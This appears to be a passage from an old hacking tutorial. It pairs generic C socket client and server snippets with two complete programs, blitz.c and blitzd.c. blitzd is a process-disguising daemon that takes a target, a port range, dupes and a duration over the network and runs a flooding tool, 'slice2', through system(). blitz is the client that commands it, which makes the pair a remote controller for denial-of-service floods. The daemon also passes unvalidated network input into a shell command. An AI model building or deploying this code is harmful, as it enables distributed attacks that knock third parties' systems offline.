#include <sys/socket.h>
#include <netinet/in.h>
/*
* Socket address, internet style.
*/
struct sockaddr_in {
u_char sin_len;
u_char sin_family;
u_short sin_port;
struct in_addr sin_addr;
char sin_zero[8];
};
sockfd = socket(AF_INET, SOCK_STREAM, 0);
bzero(&address, sizeof(saddress));
address.sin_family = AF_INET;
address.sin_addr.s_addr = inet_addr("host");
address.sin_port = htons(atoi("port"));
connect(sockfd, (struct sockaddr *)&address, sizeof(address));
write(sockfd, ...);
read(sockfd, ...);
close(sockfd);
<++> blitz.c
#include <sys/types.h>
#include <sys/socket.h>
#include <stdio.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <unistd.h>
int main(int argc, char *argv[])
{
int i;
int sockfd;
int len;
struct sockaddr_in address;
int result;
char cmd[128];
char ch;
if (argc < 9) {
fprintf(stderr, "blitz by phreeon / hydra\n");
fprintf(stderr, "syntax: %s <host> <port> <source> <destination> <start> <stop> <dupes> <duration>\n", argv[0]);
exit(1);
}
sockfd = socket(AF_INET, SOCK_STREAM, 0);
address.sin_family = AF_INET;
address.sin_addr.s_addr = inet_addr(argv[1]);
address.sin_port = htons(atoi(argv[2]));
len = sizeof(address);
result = connect(sockfd, (struct sockaddr *)&address, len);
if(result == -1) {
printf("%s->%s: connection refused!\n", argv[1], argv[4]);
exit(1);
}
sprintf(cmd, "%s %s %s %s %s %s", argv[3], argv[4], argv[5], argv[6], argv[7], argv[8]);
write(sockfd, cmd, sizeof(cmd));
read(sockfd, &ch, 1);
if (ch == '.') {
printf("%s->%s: successful!\n", argv[1], argv[4]);
}
if (ch == '!') {
printf("%s->%s: failed!\n", argv[1], argv[4]);
}
if (ch != '.' && ch != '!') {
printf("%s->%s: unknown!\n", argv[1], argv[4]);
}
close(sockfd);
exit(0);
}
<-->
#include <sys/socket.h>
#include <netinet/in.h>
int server_sockfd, client_sockfd;
struct sockaddr_in server_address;
struct sockaddr_in client_address;
server_sockfd = socket(AF_INET, SOCK_STREAM, 0);
bzero(&server_address, sizeof(server_address));
server_address.sin_family = AF_INET;
server_address.sin_port = htons(atoi("port");
server_address.sin_addr.s_addr = htonl(INADDR_ANY);
bind(server_sockfd, (struct sockaddr *)&server_address, sizeof(server_address));
switch (fork()) {
case -1:
perror("fork");
return 3;
break;
default:
close(server_sockfd);
return 0;
break;
case 0:
break;
}
listen(server_sockfd, 5);
for (;;) {
b = sizeof(client_address); // b имеет тип int
client_sockfd = accept(s, (struct sockaddr *)&client_address, &b);
read(client_sockfd, ...);
write(client_sockfd, ...);
close(client_sockfd);
}
<++> blitzd.c
#include <sys/types.h>
#include <sys/socket.h>
#include <stdio.h>
#include <netinet/in.h>
#include <sys/time.h>
#include <sys/ioctl.h>
#include <unistd.h>
#include "lists.h"
int main(int argc, char *argv[])
{
int x;
char stealth[128];
char good, bad;
time_t timeval;
int server_sockfd, client_sockfd;
int server_len, client_len;
struct sockaddr_in server_address;
struct sockaddr_in client_address;
int result;
fd_set readfds, testfds;
good = '.';
bad = '!';
if (argc < 2) {
fprintf(stderr, "blitzd by phreeon / hydra\n");
fprintf(stderr, "syntax: %s <port> <stealth>\n", argv[0]);
exit(1);
}
server_sockfd = socket(AF_INET, SOCK_STREAM, 0);
server_address.sin_family = AF_INET;
server_address.sin_addr.s_addr = htonl(INADDR_ANY);
server_address.sin_port = htons(atoi(argv[1])); 
strcpy(stealth, argv[2]);
for (x = argc-1; x >= 0; x--) {
memset(argv[x], 0, strlen(argv[x]));
}
strcpy(argv[0], stealth);
server_len = sizeof(server_address);
bind(server_sockfd, (struct sockaddr *)&server_address, server_len);
listen(server_sockfd, 5);
FD_ZERO(&readfds);
FD_SET(server_sockfd, &readfds);
while(1) {
char cmd[128], realcmd[512];
int fd;
int nread;
testfds = readfds;
(void)time(&timeval);
// printf("[%s] server waiting\n", string_range(ctime(&timeval), 0, (strlen(ctime(&timeval))-2)));
result = select(FD_SETSIZE, &testfds, (fd_set *)0, 
(fd_set *)0, (struct timeval *) 0);
if(result < 1) {
perror("server5");
exit(1);
}
for(fd = 0; fd < FD_SETSIZE; fd++) {
if(FD_ISSET(fd,&testfds)) {
if(fd == server_sockfd) {
client_sockfd = accept(server_sockfd, 
(struct sockaddr *)&client_address, &client_len);
FD_SET(client_sockfd, &readfds);
(void)time(&timeval);
// printf("[%s] adding client %s:%d on fd %d\n", string_range(ctime(&timeval), 0, (strlen(ctime(&timeval))-2)), inet_ntoa(client_address.sin_addr.s_addr), ntohs(client_address.sin_port), client_sockfd);
}
else {
ioctl(fd, FIONREAD, &nread);
if(nread == 0) {
close(fd);
FD_CLR(fd, &readfds);
(void)time(&timeval);
// printf("[%s] removing client %s on fd %d\n", string_range(ctime(&timeval), 0, (strlen(ctime(&timeval))-2)), inet_ntoa(client_address.sin_addr.s_addr), fd);
}
else {
read(fd, cmd, 128);

/* argument descriptions */
/* --------------------- */
/* source target startport stopport dupes duration */
/* 0 127.0.0.1 3 2000 2 360 */
sleep(5);
(void)time(&timeval);
// printf("[%s] serving client %s on fd %d (%s)\n", string_range(ctime(&timeval), 0, (strlen(ctime(&timeval))-2)), inet_ntoa(client_address.sin_addr.s_addr), fd, cmd);
if (llength(cmd) == 6) {
sprintf(realcmd, "./slice2 %s > /dev/null &\nsleep %s; kill `pidof slice2`;", lrange(cmd, 0, 4), lindex(cmd, -1));
write(fd, &good, 1);
system(realcmd);
} else {
write(fd, &bad, 1);
}
}
}
}
}
}
}
<-->
